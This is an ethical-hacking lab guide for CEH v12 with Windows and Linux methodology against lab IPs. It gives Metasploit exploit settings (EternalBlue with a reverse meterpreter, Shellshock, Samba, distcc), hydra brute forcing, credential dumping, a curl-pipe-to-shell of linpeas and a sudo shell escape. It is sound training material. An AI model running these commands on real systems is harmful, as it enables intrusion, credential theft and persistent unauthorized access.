# CEH v12 Penetration Testing Lab Guide - Windows & Linux

## ⚠️ Important Legal Disclaimer

**This guide is for educational purposes only in authorized lab environments.**
- Only test systems you own or have explicit written permission to test
- Use isolated, offline lab environments
- Follow responsible disclosure practices
- CEH emphasizes **ethical** hacking principles

---

# Windows Penetration Testing

## 🏠 Windows Lab Environment Setup

### Virtualization Setup
```bash
# Recommended Network Configuration
Attacker (Kali Linux): 192.168.100.10
Windows Target: 192.168.100.20
Additional Target: 192.168.100.30
```

## 📋 Windows Methodology

### 1. Reconnaissance
```bash
nmap -sn 192.168.100.0/24
nmap -sS -sV -O 192.168.100.20
```

### 2. SMB/NetBIOS Enumeration
```bash
nmap --script smb-os-discovery 192.168.100.20
nmap --script smb-enum-shares 192.168.100.20
enum4linux -a 192.168.100.20
smbclient -L //192.168.100.20 -N
```

### 3. Common Windows Exploits
```bash
# EternalBlue (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.100.20
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.100.10
exploit

# SMB Psexec
use exploit/windows/smb/psexec
set RHOSTS 192.168.100.20
set SMBUser administrator
set SMBPass Password123
exploit
```

### 4. Password Attacks
```bash
hydra -L users.txt -P passwords.txt smb://192.168.100.20
hydra -L users.txt -P passwords.txt rdp://192.168.100.20
```

### 5. Post-Exploitation
```bash
# Meterpreter commands
sysinfo
getuid
hashdump
run post/windows/gather/credentials
run post/multi/recon/local_exploit_suggester
```

### 6. Privilege Escalation
```bash
# Common Windows PrivEsc vectors
getsystem
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_shares
```

---

# Linux Penetration Testing

## 🏠 Linux Lab Environment Setup

### Virtualization Setup
```bash
# Recommended Network Configuration
Attacker (Kali Linux): 192.168.200.10
Linux Target: 192.168.200.20
Metasploitable: 192.168.200.30
```

## 📋 Linux Methodology

### 1. Reconnaissance & Enumeration
```bash
nmap -sS -sV -sC -O 192.168.200.20
nmap -p- --min-rate 1000 192.168.200.20
nmap --script vuln 192.168.200.20
```

### 2. Service-Specific Enumeration
```bash
# SSH Enumeration
nmap --script ssh2-enum-algos 192.168.200.20

# Web Enumeration
gobuster dir -u http://192.168.200.20 -w /usr/share/wordlists/dirb/common.txt
nikto -h http://192.168.200.20

# FTP Checks
ftp 192.168.200.20  # Try anonymous login
nmap --script ftp-anon 192.168.200.20
```

### 3. Common Linux Exploits
```bash
# Samba usermap_script
use exploit/multi/samba/usermap_script
set RHOST 192.168.200.20
exploit

# Shellshock
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOST 192.168.200.20
set TARGETURI /cgi-bin/test.cgi
exploit

# DistCC
use exploit/unix/misc/distcc_exec
set RHOST 192.168.200.20
exploit
```

### 4. Password Attacks
```bash
hydra -L users.txt -P passwords.txt ssh://192.168.200.20
hydra -L users.txt -P passwords.txt ftp://192.168.200.20
```

### 5. Web Application Attacks
```bash
sqlmap -u "http://192.168.200.20/login.php" --forms --batch
wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt http://192.168.200.20/FUZZ
```

### 6. Privilege Escalation
```bash
# Automated Enumeration
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Manual Checks
find / -perm -4000 -type f 2>/dev/null  # SUID files
find / -writable 2>/dev/null            # Writable files
sudo -l                                 # Sudo permissions
cat /etc/crontab                       # Cron jobs
```

### 7. Common Linux PrivEsc Vectors
```bash
# SUID Exploitation
find / -perm -4000 -exec ls -la {} \; 2>/dev/null

# Sudo Misconfiguration
sudo -l
sudo find /etc/passwd -exec /bin/sh \;

# Cron Jobs
ls -la /etc/cron*
cat /etc/crontab

# Kernel Exploits
uname -a
searchsploit "Linux Kernel"
```

---

# Common Tools & Techniques

## 🔧 Essential Tools Checklist

### Information Gathering
- [ ] Nmap
- [ ] Netdiscover
- [ ] Enum4linux (Windows)
- [ ] Smbclient

### Vulnerability Assessment
- [ ] Nessus/OpenVAS
- [ ] Nikto
- [ ] Gobuster/Dirb

### Exploitation
- [ ] Metasploit Framework
- [ ] Hydra
- [ ] Sqlmap
- [ ] Searchsploit

### Post-Exploitation
- [ ] Meterpreter
- [ ] LinPEAS (Linux)
- [ ] WinPEAS (Windows)
- [ ] Mimikatz (Windows)

## 🧪 Practice Exercises

### Windows Exercises
1. **Enumeration**: Enumerate SMB shares and users
2. **Exploitation**: Exploit MS17-010 vulnerability
3. **PrivEsc**: Escalate to SYSTEM privileges
4. **Lateral Movement**: Move to another Windows machine

### Linux Exercises
1. **Service Enumeration**: Identify all running services
2. **Web App Testing**: Find and exploit web vulnerabilities
3. **Privilege Escalation**: Escalate from user to root
4. **Persistence**: Establish backdoor access

---
